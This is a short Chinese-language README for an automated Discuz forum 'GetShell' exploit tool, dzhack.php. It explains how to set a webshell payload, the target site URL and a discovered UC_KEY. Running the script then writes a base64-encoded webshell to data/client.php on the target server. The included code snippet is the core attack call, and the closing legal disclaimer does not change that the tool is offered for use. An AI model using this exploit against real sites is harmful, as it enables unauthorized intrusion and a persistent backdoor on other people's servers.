#### Discuz 全自动 GetShell

本方法比写 config_ucenter.php 更加稳定，而且不易出错

#### 用法

打开 `dzhack.php`, 找到 

```
$webshell = '<?php phpinfo(); ?>';
 
list ($status, $data) = $dz->hack (
   'http://ubuntu64/dz/',
   'K856C548X2xaTcDdc248I1pc57gdq4vdL2SdH3ifGd4a0ec6UdcfX0B7m9Ubrcs4',
   'file_put_contents("data/client.php", base64_decode ("' . base64_encode ($webshell) . '"));'
   );
```

先把第一行 `$webshell` 的内容改了，不需要考虑编码问题，

然后修改 `hack` 函数的参数，第一个为 discuz 的起始路径，第二行为你找到的 UC_KEY

然后执行 `php dzhack.php`,

会在 `data/client.php` 下面生成一个 webshell,

##### Legal Disclaimer

Using this tool is legit but hacking may not be. The author does not take any responsibility for such activities.

